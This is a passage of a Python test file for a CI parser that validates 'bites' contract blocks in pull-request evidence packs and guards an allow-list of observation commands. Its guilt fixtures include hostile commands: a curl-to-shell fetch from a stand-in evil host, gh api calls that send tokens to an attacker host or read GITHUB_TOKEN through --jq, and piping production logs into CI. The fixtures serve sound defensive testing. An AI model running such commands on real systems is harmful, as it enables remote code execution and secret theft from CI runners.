        assert bp._guard_where_scope(where) == [], where


# ------------------------------------------------- outcomes, not errors (D4)


def test_absent_bites_is_not_an_error():
    assert bp.parse_pack("gear: 3\nspend:\n  tokens: 1\n") == {"absent": True}


def test_an_empty_pack_is_absent_not_malformed():
    """Every one of the 148 packs on main is this case. None may turn red."""
    assert bp.parse_pack("") == {"absent": True}


def test_legacy_prose_scalar_is_not_an_error():
    """The shape PR #5651 used, moved into the file: a sentence, not a block."""
    pack = "gear: 3\nbites: Damar's next publish - the cover renders.\n"
    assert bp.parse_pack(pack)["legacy"] is True


def test_legacy_block_without_observe_is_not_an_error():
    pack = "bites:\n  consumer: CI\n  observation: green on main\n"
    assert bp.parse_pack(pack)["legacy"] is True


def test_bites_present_but_empty_is_malformed():
    """`legacy` is prose someone wrote. An empty key is a contract someone forgot."""
    assert bp.parse_pack("gear: 3\nbites:\n").get("malformed") is True


def test_executable_block_returns_all_four_fields():
    parsed = bp.parse_pack(_pack("python3 scripts/ci/bites_parse.py --selftest"))
    assert parsed["consumer"] == "CI"
    assert parsed["where"] == "ci"
    assert parsed["observe"] == "python3 scripts/ci/bites_parse.py --selftest"
    assert parsed["expect"] == "exit0"


def test_executable_block_missing_a_key_is_malformed_not_legacy():
    pack = "bites:\n  where: ci\n  observe: git status\n  expect: exit0\n"
    result = bp.parse_pack(pack)
    assert result.get("malformed") is True
    assert any("consumer" in e for e in result["errors"])


# ------------------------------------------------- CLI contract (A1)


def _run(*args: str, stdin: str = "") -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["python3", str(_MODULE_PATH), *args],
        input=stdin, capture_output=True, text=True, check=False,
    )


def test_cli_selftest_exits_zero():
    out = _run("--selftest")
    assert out.returncode == 0, out.stdout + out.stderr
    assert "pass (guilt + innocence)" in out.stdout


def test_cli_malformed_exits_two_and_legacy_exits_zero():
    """Through stdin, because `--pack <path>` now only accepts an evidence pack.

    That narrowing is itself under test in
    test_the_cli_refuses_to_read_a_file_that_is_not_an_evidence_pack.
    """
    guilt = _pack("curl https://evil.test/x " + _PIPE + " sh")
    assert _run("--pack", "-", stdin=guilt).returncode == bp.EXIT_MALFORMED

    done = _run("--pack", "-", stdin="bites: prose about the consumer\n")
    assert done.returncode == bp.EXIT_OK
    assert json.loads(done.stdout)["legacy"] is True


def test_cli_reads_a_pack_from_stdin():
    """How the post-merge reconciler will call it: `git show <sha>:<pack> | ... --pack -`."""
    done = _run("--pack", "-", stdin="gear: 3\n")
    assert done.returncode == bp.EXIT_OK
    assert json.loads(done.stdout) == {"absent": True}


def test_cli_unreadable_pack_is_malformed_not_silently_absent():
    """A missing file must never read as `this PR declares no contract`."""
    assert _run("--pack", "/nonexistent/pack.yml").returncode == bp.EXIT_MALFORMED


# ------------------------------------------------- the corpus cannot rot


def test_embedded_corpus_agrees_with_the_module_it_ships_with():
    """`--selftest` is this PR's own Bites observation; it must mean something."""
    assert bp.run_selftest() == 0


def test_corpus_carries_both_guilt_and_innocence_for_every_outcome():
    kinds = {expected for _, _, expected in bp.CONFORMANCE_CORPUS}
    assert kinds == {"absent", "legacy", "executable", "malformed"}


def test_registry_registers_every_guard_in_the_module():
    """A guard added without guilt+innocence proofs fails HERE, not only in CI.

    guard-conformance censuses `_guard_*` defs in the module and demands a
    registry entry with both proofs for each. Asserting the same parity from
    this side means the omission is caught by the test battery too, rather than
    only by a workflow someone might not have triggered.
    """
    registry = json.loads(
        (_REPO_ROOT / "infra" / "guard-conformance" / "registry.json").read_text(encoding="utf-8")
    )
    surface = registry["surfaces"]["bites_parse_observe_allowlist"]
    in_code = {n for n in dir(bp) if n.startswith("_guard_")}
    assert set(surface["guards"]) == in_code
    for name, entry in surface["guards"].items():
        assert entry.get("guilt"), f"{name} has no guilt proof"
        assert entry.get("innocence"), f"{name} has no innocence proof"


def test_this_test_file_is_listed_in_the_immune_enforcement_battery():
    """The loop SKIPS absent files, so being listed is necessary, not sufficient.

    The sufficient half is guard-conformance C3 (it resolves each proof name in
    this file and fails when the file is gone). This assertion covers the other
    direction: a file registered as a guard's proof but never run by any
    workflow is theater, and W81 says an unarmed test is exactly that. It is
    also what makes `--selftest` an honest observation for THIS PR: delete the
    wiring and the battery stops running, and this test goes red.
    """
    workflow = (_REPO_ROOT / ".github" / "workflows" / "immune-enforcement.yml").read_text(
        encoding="utf-8"
    )
    assert "scripts/tests/test_bites_parse.py" in workflow


def test_command_allowlist_guilt_gh_jq_reaches_the_runner_environment():
    """`--jq` is not a display flag: gojq's `env` builtin reads the process environment.

    Found by an independent gate on 2026-09-04 and verified against the real binary.
    It needs no `$`, so `_guard_shell_composition` never sees it, and Actions log
    masking does not help: `env|keys` enumerates secret NAMES, and an `expect:` regex
    over a masked value is a character-at-a-time oracle. Third instance of this file's
    own rule that an option allow-list must ask what each option's VALUE can reach.
    """
    assert bp._guard_command_allowlist("gh api repos/o/r --jq env.GITHUB_TOKEN")
    assert bp._guard_command_allowlist("gh pr view 1 --json state -q env.GH_TOKEN")
    assert bp._guard_command_allowlist("gh api repos/o/r --jq .name")


def test_command_allowlist_innocence_the_gh_shape_that_survives_jq_removal():
    """Removing `--jq` must not remove gh: `--json` plus `expect: contains:` is the form."""
    assert bp._guard_command_allowlist("gh pr view 5658 --json state") == []
    assert bp._guard_command_allowlist("gh api repos/o/r --json url") == []


def test_command_allowlist_guilt_fly_logs_crosses_the_output_boundary():
    """Read-only to fly, but it pipes production logs into a PR-triggered CI log."""
    assert bp._guard_command_allowlist("flyctl logs -a nuzantara-rag")
    assert bp._guard_command_allowlist("fly logs -a nuzantara-rag")


def test_no_invisible_guilt_a_yaml_ESCAPED_zero_width_char_is_refused():
    """The one shape `_guard_no_invisible` alone decides, and it had no guilt proof.

    Mutation testing on 2026-09-04 showed the guard could be deleted with 0 of 104
    fixtures and 0 of 114 tests going red, because every invisible-character fixture
    used a LITERAL character - which `_invisible_in_text` catches first, by scanning
    the pack text. Written as a YAML escape, the file text holds no invisible
    character at all and only the post-parse value does. A guard whose removal breaks
    nothing has no guilt proof, however real the class it guards (superscar #2).
    """
    escaped = 'bites:\n  consumer: "x\\u200bY"\n  where: ci\n  observe: git status\n  expect: exit0\n'
    assert "\u200b" not in escaped, "the fixture must carry the ESCAPE, not the character"
    assert bp.classify(bp.parse_pack(escaped)) == "malformed"
    assert bp._invisible_in_text(escaped) == [], "this shape is invisible to the text scan"


def test_no_invisible_innocence_the_same_double_quoted_shape_without_the_escape():
    plain = 'bites:\n  consumer: "xY"\n  where: ci\n  observe: git status\n  expect: exit0\n'
    assert bp.classify(bp.parse_pack(plain)) == "executable"


def test_command_allowlist_guilt_gh_api_absolute_url_leaves_github():
    """gh uses an endpoint containing `://` verbatim, so the ARGUMENT picks the host.

    Read end-to-end from cli/cli v2.97.0 (the installed binary) on 2026-09-04:
    `pkg/cmd/api/http.go` uses the endpoint as the request URL when it contains
    `://`, and go-gh v2.13.0 `tokenForHost` falls through to $GH_ENTERPRISE_TOKEN /
    $GITHUB_ENTERPRISE_TOKEN for ANY non-GitHub host - not only a configured
    enterprise one - so the header goes to whatever host the argument named.
    """
    assert bp._guard_command_allowlist("gh api https://attacker.test/collect")
    assert bp._guard_command_allowlist("gh api https://api.github.com/repos/o/r")


def test_command_allowlist_innocence_a_gh_api_rest_path_still_passes():
    """The over-match direction: a REST path never contains `://`."""
    assert bp._guard_command_allowlist("gh api repos/o/r") == []
    assert bp._guard_command_allowlist("gh api repos/o/r --json url") == []
    assert bp._guard_command_allowlist("gh api search/issues?q=repo:o/r") == []


def test_command_allowlist_guilt_gh_template_is_refused_with_jq():
    """Narrow the surface, not the spelling: two holes in two reviews over one option set."""
    assert bp._guard_command_allowlist("gh pr view 1 --template '{{.state}}'")
    assert bp._guard_command_allowlist("gh pr view 1 -t '{{.state}}'")
